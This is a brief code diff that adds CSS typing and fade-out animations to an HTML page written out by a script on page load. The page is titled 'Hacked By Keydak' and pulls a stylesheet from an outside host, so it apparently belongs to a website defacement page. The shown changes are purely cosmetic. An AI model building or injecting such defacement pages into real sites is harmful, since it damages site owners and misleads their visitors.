@@ -14,6 +14,38 @@ document.addEventListener('DOMContentLoaded', function () {
             <title>Home - Hacked By Keydak</title>
             <link rel="stylesheet" href="https://kepo-six.vercel.app/style.css">
         </head>
+        <style>
+           .mainContainer {
+                    text-align: center;
+                    padding-top: 50px;
+                }
+
+                .text-container {
+                    display: inline-block;
+                    overflow: hidden;
+                    white-space: nowrap;
+                    position: relative;
+                    font-family: monospace;
+                }
+
+                .text1 {
+                    display: inline-block;
+                    overflow: hidden;
+                    white-space: nowrap;
+                    border-right: 3px solid;
+                    animation: typing 4s steps(30, end), fadeOut 4s 2s forwards;
+                }
+
+                @keyframes typing {
+                    from { width: 0 }
+                    to { width: 100% }
+                }
+
+                @keyframes fadeOut {
+                    from { opacity: 1; }
+                    to { opacity: 0; }
+                }
+        </style>
         <body>
             <div class="mainContainer">
                 <div class="img">
